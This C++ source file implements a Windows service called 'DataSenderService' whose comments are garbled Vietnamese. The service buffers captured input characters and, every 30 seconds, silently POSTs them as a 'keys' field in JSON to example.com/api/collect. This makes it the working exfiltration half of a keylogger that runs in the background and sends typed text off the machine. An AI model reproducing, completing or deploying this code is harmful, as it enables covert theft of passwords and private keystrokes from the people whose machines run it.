#include "Service.h"
#include <sstream>
#include <chrono>
#include <iomanip>
#include <winhttp.h>
#include <shlobj.h>
#pragma comment(lib, "winhttp.lib")

const wchar_t* DataSenderService::ServiceName = L"DataSenderService";
const wchar_t* DataSenderService::ServiceDisplayName = L"Data Sender Service";

DataSenderService* DataSenderService::s_instance = nullptr;

static std::wstring g_logPath;
static HANDLE g_eventSource = nullptr;

static std::string WideToUtf8Str(const std::wstring& w)
{
    if (w.empty()) return {};
    int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string out(len, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &out[0], len, nullptr, nullptr);
    return out;
}

static std::wstring GetExeDirectory()
{
    wchar_t path[MAX_PATH]{};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    std::wstring p = path;
    auto pos = p.find_last_of(L"\\/");
    if (pos != std::wstring::npos) p.resize(pos + 1);
    return p;
}

static void InitEventSource()
{
    if (!g_eventSource)
        g_eventSource = RegisterEventSourceW(nullptr, DataSenderService::ServiceName);
}

static void ReportEventMessage(const std::wstring& msg)
{
    InitEventSource();
    if (g_eventSource)
    {
        LPCWSTR arr[1]{ msg.c_str() };
        ReportEventW(g_eventSource, EVENTLOG_INFORMATION_TYPE, 0, 0, nullptr, 1, 0, arr, nullptr);
    }
    OutputDebugStringW((L"[DataSenderService] " + msg + L"\n").c_str());
}

static void InitializeLogPath()
{
    wchar_t programData[MAX_PATH]{};
    bool set = false;
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_COMMON_APPDATA, nullptr, SHGFP_TYPE_CURRENT, programData)))
    {
        std::wstring dir = std::wstring(programData) + L"\\DataSenderService";
        CreateDirectoryW(dir.c_str(), nullptr);
        if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_SUCCESS)
        {
            g_logPath = dir + L"\\service.log";
            set = true;
        }
    }
    if (!set)
        g_logPath = GetExeDirectory() + L"service.log";
}

static bool AppendLineToLogFileUtf8(const std::wstring& line)
{
    if (g_logPath.empty())
        InitializeLogPath();

    HANDLE h = CreateFileW(g_logPath.c_str(), FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE)
    {
        DWORD err = GetLastError();
        static bool warned = false;
        if (!warned)
        {
            std::wstringstream ss;
            ss << L"Cannot open log file: " << g_logPath << L" (err=" << err << L")";
            ReportEventMessage(ss.str());
            warned = true;
        }
        return false;
    }

    LARGE_INTEGER size{};
    if (GetFileSizeEx(h, &size) && size.QuadPart == 0)
    {
        const unsigned char bom[3] = { 0xEF, 0xBB, 0xBF };
        DWORD written = 0;
        WriteFile(h, bom, 3, &written, nullptr);
    }

    SYSTEMTIME st{}; GetLocalTime(&st);
    std::wstringstream ws;
    ws << L"[" << st.wYear << L"-" << std::setw(2) << std::setfill(L'0') << st.wMonth
       << L"-" << std::setw(2) << st.wDay << L" "
       << std::setw(2) << st.wHour << L":" << std::setw(2) << st.wMinute
       << L":" << std::setw(2) << st.wSecond << L"] " << line << L"\r\n";

    std::string utf8 = WideToUtf8Str(ws.str());
    DWORD written = 0;
    WriteFile(h, utf8.data(), (DWORD)utf8.size(), &written, nullptr);
    CloseHandle(h);
    return true;
}

DataSenderService::DataSenderService() {}
DataSenderService::~DataSenderService() { Stop(); }

void DataSenderService::ServiceMain(DWORD, LPWSTR*)
{
    if (!s_instance)
        s_instance = new DataSenderService();

    s_instance->m_statusHandle = RegisterServiceCtrlHandlerW(ServiceName, ServiceCtrlHandler);
    if (!s_instance->m_statusHandle)
        return;

    InitializeLogPath();
    ReportEventMessage(L"ServiceMain entered. Log path: " + g_logPath);

    s_instance->SetStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    s_instance->m_stopEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (!s_instance->m_stopEvent)
    {
        s_instance->SetStatus(SERVICE_STOPPED, GetLastError());
        ReportEventMessage(L"CreateEvent failed");
        return;
    }

    s_instance->Run();
}

void DataSenderService::ServiceCtrlHandler(DWORD ctrlCode)
{
    switch (ctrlCode)
    {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        if (s_instance) s_instance->Stop();
        break;
    default:
        break;
    }
}

void DataSenderService::Run()
{
    m_running = true;
    SetStatus(SERVICE_START_PENDING, NO_ERROR, 2000);

    try {
        m_workerThread = std::thread(&DataSenderService::WorkerLoop, this);
    } catch (...) {
        Log(L"Failed to start worker thread");
        SetStatus(SERVICE_STOPPED, ERROR_SERVICE_SPECIFIC_ERROR);
        return;
    }

    SetStatus(SERVICE_RUNNING);
    Log(L"Service started");

    WaitForSingleObject(m_stopEvent, INFINITE);

    SetStatus(SERVICE_STOP_PENDING, NO_ERROR, 5000);
    if (m_workerThread.joinable())
        m_workerThread.join();

    SetStatus(SERVICE_STOPPED);
    Log(L"Service stopped");
}

void DataSenderService::Stop()
{
    if (!m_running) return;
    m_running = false;
    if (m_stopEvent) SetEvent(m_stopEvent);
}

void DataSenderService::SetStatus(DWORD state, DWORD win32ExitCode, DWORD waitHint)
{
    m_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    m_status.dwCurrentState = state;
    m_status.dwWin32ExitCode = win32ExitCode;
    m_status.dwControlsAccepted = (state == SERVICE_START_PENDING) ? 0 : SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    m_status.dwCheckPoint = 0;
    m_status.dwWaitHint = waitHint;
    if (m_statusHandle) SetServiceStatus(m_statusHandle, &m_status);
}

void DataSenderService::ReportPending(DWORD checkpoint, DWORD waitHint)
{
    m_status.dwCurrentState = SERVICE_START_PENDING;
    m_status.dwCheckPoint = checkpoint;
    m_status.dwWaitHint = waitHint;
    if (m_statusHandle) SetServiceStatus(m_statusHandle, &m_status);
}

void DataSenderService::WorkerLoop()
{
    const int intervalSeconds = 30;
    while (m_running)
    {
        auto payload = BuildPayload();
        bool ok = SendPayload(payload);
        Log(std::wstring(L"Send result: ") + (ok ? L"OK" : L"FAIL"));
        for (int i = 0; i < intervalSeconds && m_running; ++i)
            std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

// ??nh ngh?a bi?n t?nh buffer input
std::wstring DataSenderService::s_inputBuffer;
std::mutex DataSenderService::s_inputMutex;

// NEW: hàm append
void DataSenderService::AppendInput(const std::wstring& chars)
{
    if (chars.empty()) return;
    std::lock_guard<std::mutex> lock(s_inputMutex);
    // Gi?i h?n kích th??c tránh phình vô h?n (ví d? 4096)
    if (s_inputBuffer.size() + chars.size() > 4096)
    {
        // C?t b?t ??u cho v?a
        size_t overflow = (s_inputBuffer.size() + chars.size()) - 4096;
        if (overflow < s_inputBuffer.size())
            s_inputBuffer.erase(0, overflow);
        else
            s_inputBuffer.clear();
    }
    s_inputBuffer.append(chars);
}

// Thay th? n?i dung hàm BuildPayload hi?n t?i:
std::wstring DataSenderService::BuildPayload()
{
    // L?y timestamp
    SYSTEMTIME st{}; GetLocalTime(&st);
    std::wstring captured;
    {
        // Rút buffer và xóa ?? không g?i l?p
        std::lock_guard<std::mutex> lock(s_inputMutex);
        captured.swap(s_inputBuffer);
    }

    // Escape các ký t? ??c bi?t JSON t?i gi?n (ch? x? lý backslash và quote)
    std::wstring escaped;
    escaped.reserve(captured.size());
    for (wchar_t c : captured)
    {
        switch (c)
        {
        case L'\\': escaped += L"\\\\"; break;
        case L'"':  escaped += L"\\\""; break;
        case L'\r': /* b? ho?c thay */ break;
        case L'\n': escaped += L"\\n"; break;
        case L'\t': escaped += L"\\t"; break;
        default:
            // Gi?i h?n hi?n th?: ch? thêm ký t? in ???c c? b?n
            if (c >= 32) escaped.push_back(c);
            else escaped += L"?";
            break;
        }
    }

    std::wstringstream ss;
    ss << L"{\"timestamp\":\""
       << st.wYear << L"-"
       << std::setw(2) << std::setfill(L'0') << st.wMonth << L"-"
       << std::setw(2) << st.wDay << L"T"
       << std::setw(2) << st.wHour << L":"
       << std::setw(2) << st.wMinute << L":"
       << std::setw(2) << st.wSecond
       << L"\",\"value\":123";

    // Thêm tr??ng keys ch? khi có n?i dung
    if (!escaped.empty())
        ss << L",\"keys\":\"" << escaped << L"\"";

    ss << L"}";
    return ss.str();
}


bool DataSenderService::SendPayload(const std::wstring& payload)
{
    const wchar_t* host = L"example.com";
    const INTERNET_PORT port = 443;
    const wchar_t* path = L"/api/collect";

    bool success = false;
    HINTERNET hSession = WinHttpOpen(L"DataSenderService/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (hConnect)
    {
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, nullptr,
                                                WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                WINHTTP_FLAG_SECURE);
        if (hRequest)
        {
            std::string narrow(payload.begin(), payload.end());
            BOOL b = WinHttpSendRequest(hRequest,
                                        L"Content-Type: application/json\r\n",
                                        (DWORD)-1L,
                                        (LPVOID)narrow.c_str(),
                                        (DWORD)narrow.size(),
                                        (DWORD)narrow.size(),
                                        0);
            if (b) b = WinHttpReceiveResponse(hRequest, nullptr);
            if (b)
            {
                DWORD statusCode = 0; DWORD size = sizeof(statusCode);
                if (WinHttpQueryHeaders(hRequest,
                    WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                    WINHTTP_HEADER_NAME_BY_INDEX,
                    &statusCode, &size, WINHTTP_NO_HEADER_INDEX))
                {
                    success = (statusCode >= 200 && statusCode < 300);
                }
            }
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
    }
    WinHttpCloseHandle(hSession);
    return success;
}

void DataSenderService::Log(const std::wstring& line)
{
    std::lock_guard<std::mutex> lock(m_logMutex);
    if (!AppendLineToLogFileUtf8(line))
        ReportEventMessage(L"(fallback) " + line);
}
